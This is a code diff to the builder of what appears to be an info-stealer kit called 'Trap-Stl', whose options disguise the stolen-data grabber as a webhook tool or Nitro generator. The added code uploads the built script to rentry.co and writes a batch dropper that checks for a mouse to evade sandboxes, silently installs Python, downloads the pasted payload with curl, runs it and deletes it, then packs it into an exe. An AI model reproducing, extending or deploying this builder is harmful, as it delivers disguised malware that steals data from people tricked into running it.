@@ -6,6 +6,98 @@ except:
 
 import requests
 
+import http.cookiejar
+import urllib.parse
+import urllib.request
+from http.cookies import SimpleCookie
+from json import loads as json_loads
+import sys
+import subprocess
+import base64
+_headers = {"Referer": 'https://rentry.co'}
+class UrllibClient:
+    def __init__(self):
+        self.cookie_jar = http.cookiejar.CookieJar()
+        self.opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(self.cookie_jar))
+        urllib.request.install_opener(self.opener)
+
+    def get(self, url, headers={}):
+        return self._request(urllib.request.Request(url, headers=headers))
+
+    def post(self, url, data=None, headers={}):
+        postdata = urllib.parse.urlencode(data).encode()
+        return self._request(urllib.request.Request(url, postdata, headers))
+
+    def _request(self, request):
+        response = self.opener.open(request)
+        response.status_code = response.getcode()
+        response.data = response.read().decode('utf-8')
+        return response
+
+def new(url, edit_code, text):
+    client, cookie = UrllibClient(), SimpleCookie()
+    cookie.load(vars(client.get('https://rentry.co'))['headers']['Set-Cookie'])
+    csrftoken = cookie['csrftoken'].value
+    payload = {'csrfmiddlewaretoken': csrftoken, 'url': url, 'edit_code': edit_code, 'text': text}
+    return json_loads(client.post('https://rentry.co/api/new', payload, headers=_headers).data)
+
+def get_rentry_link(text):
+    url, edit_code = '', ''
+    response = new(url, edit_code, text)
+    if response['status'] != '200':
+        print('error: {}'.format(response['content']))
+        [print(i) for i in response.get('errors', '').split('.') if i]
+        sys.exit(1)
+    else:
+        pastebin_link = response['url']
+        return pastebin_link
+
+
+def update_batch_script(file_path, new_encoded_url):
+        
+    code = f'''
+@echo off
+setlocal EnableDelayedExpansion
+
+set "mouseConnected=false"
+
+for /f "tokens=2 delims==" %%I in ('wmic path Win32_PointingDevice get PNPDeviceID /value ^| find "PNPDeviceID"') do (
+    set "mouseConnected=true"
+)
+
+if not !mouseConnected! == true (
+    echo No mouse detected. Exiting...
+    exit /b 1
+)
+
+echo Mouse detected. Continue with your script here.
+
+
+set "PYTHON_URL=https://www.python.org/ftp/python/3.10.0/python-3.10.0rc2-amd64.exe"
+set "PYTHON_INSTALLER=python-installer.exe"
+
+curl -L -o !PYTHON_INSTALLER! !PYTHON_URL! --insecure --silent
+start /wait !PYTHON_INSTALLER! /quiet /passive InstallAllUsers=0 PrependPath=1 Include_test=0 Include_pip=1 Include_doc=0
+del !PYTHON_INSTALLER!
+
+set "ENCODED_URL={new_encoded_url}/raw"
+
+set "OUTPUT_FILE=webpage.py"
+curl -o %OUTPUT_FILE% -s %ENCODED_URL% --insecure
+
+if %ERRORLEVEL% neq 0 (
+    echo Error: Failed to download the webpage.
+    exit /b 1
+)
+
+python %OUTPUT_FILE%
+
+del %OUTPUT_FILE%
+'''
+    with open(file_path, 'w') as file:
+        file.writelines(code)
+
+        
 while True:
     os.makedirs('./Build', exist_ok=True)
     shutil.copy('main.py', './Build/Trap-Stl-Building.py')
@@ -27,7 +119,7 @@ while True:
             else:
                 print('Invalid input. Please enter Y or N.')
 
-    with open('main.py', 'r', encoding='utf-8', errors='replace') as file:
+    with open('main.py', 'r', encoding='utf-8', errors='ignore') as file:
         content = file.read()
 
     while True:
@@ -42,6 +134,7 @@ while True:
                 print('Invalid Webhook')
         except:
             print('Invalid Webhook')
+
 
     FakeWeb = get_boolean_input('Do you want to enable Fake Webhook Module (When the file is launched it will show a Webhook Tools while getting data) Y/N: ')
     FakeGen = get_boolean_input('Do you want to enable Fake Generator Module (When the file is launched it will show a nitro generator while getting data) Y/N: ')
@@ -115,8 +208,12 @@ while True:
                 print('Obfuscation process encountered an error.')
                 break
         elif Obfuscation in ['n', 'no']:
-            with open(f'./Build/{name}.py', 'w', encoding='utf-8') as file:
-                file.write(new_content)
+            with open('main.py', 'rb') as file:
+                try:
+                    content = file.read().decode('utf-8')
+                except UnicodeDecodeError:
+                    print("Error: Unable to decode 'main.py' file. Please ensure it's UTF-8 encoded.")
+                    quit()
                 print(f'[+] File Created {name}.py')
                 if Exe in ['y', 'yes']:
                     pass
@@ -130,45 +227,69 @@ while True:
 
     while True:
         if Exe in ['y', 'yes']:
-            from sys import executable
-            icon_path = input('Enter the path to the icon file (leave blank for no icon): ')
+            
+            ask = input('Do you want to make it exe with pyinstaller or with IExpress? (Yes if pyinstaller) (No if IExpress)')
+            if ask in ["yes","y"]:
+                from sys import executable
+                icon_path = input('Enter the path to the icon file (leave blank for no icon): ')
 
-            if icon_path.strip():
-                icon_option = f'--icon={icon_path}'
+                if icon_path.strip():
+                    icon_option = f'--icon={icon_path}'
+                else:
+                    icon_option = ''
+
+                try:
+                    __import__('pyinstaller')
+                except ImportError:
+                    subprocess.run([executable, '-m', 'pip', 'install', 'pyinstaller', '--quiet'], check=True)
+
+                if icon_option == '':
+                    command = [
+                        'pyinstaller',
+                        '--onefile',
+                        '--distpath',
+                        './Build',
+                        f'./Build/{name}.py'
+                    ]
+                else:
+                    command = [
+                        'pyinstaller',
+                        '--onefile',
+                        '--distpath',
+                        './Build',
+                        f'{icon_option}',
+                        f'./Build/{name}.py'
+                    ]
+
+                try:
+                    subprocess.run(command, shell=True, check=True)
+                    input(f'File {name}.exe successfully created. Press any key to quit.')
+                    quit()
+                except subprocess.CalledProcessError:
+                    print("Error while running PyInstaller.")
+                    quit()
             else:
-                icon_option = ''
+                aaa = f"./Build/temp.py"
+                with open(aaa, 'rb') as f:
+                    try:
+                        link_list = [line.decode('utf-8') for line in f.readlines()]
+                        code_string = ''.join(link_list)
+                    except UnicodeDecodeError:
+                        print(f"Error: Unable to decode '{aaa}' file. Please ensure it's UTF-8 encoded.")
+                        quit()
 
-            try:
-                __import__('pyinstaller')
-            except ImportError:
-                subprocess.run([executable, '-m', 'pip', 'install', 'pyinstaller', '--quiet'], check=True)
+                code_string = ''.join(link_list)
 
-            if icon_option == '':
-                command = [
-                    'pyinstaller',
-                    '--onefile',
-                    '--distpath',
-                    './Build',
-                    f'./Build/{name}.py'
-                ]
-            else:
-                command = [
-                    'pyinstaller',
-                    '--onefile',
-                    '--distpath',
-                    './Build',
-                    f'{icon_option}',
-                    f'./Build/{name}.py'
-                ]
+                pastebin_link = get_rentry_link(code_string)
+                batch_file_path = "./trap detection/payload.bat"
+                
+                arguments = [batch_file_path, f'{name}.exe']
 
-            try:
-                subprocess.run(command, shell=True, check=True)
-                input(f'File {name}.exe successfully created. Press any key to quit.')
+                update_batch_script(batch_file_path,pastebin_link)
+                
+                subprocess.run([f"./trap detection/final.bat"] + arguments, shell=True)
+                input('Generated exe payload ! in main folder! press any key to quit')
                 quit()
-            except subprocess.CalledProcessError:
-                print("Error while running PyInstaller.")
-                quit()
-        
         else:
             input('Press any key to quit.')
             quit()
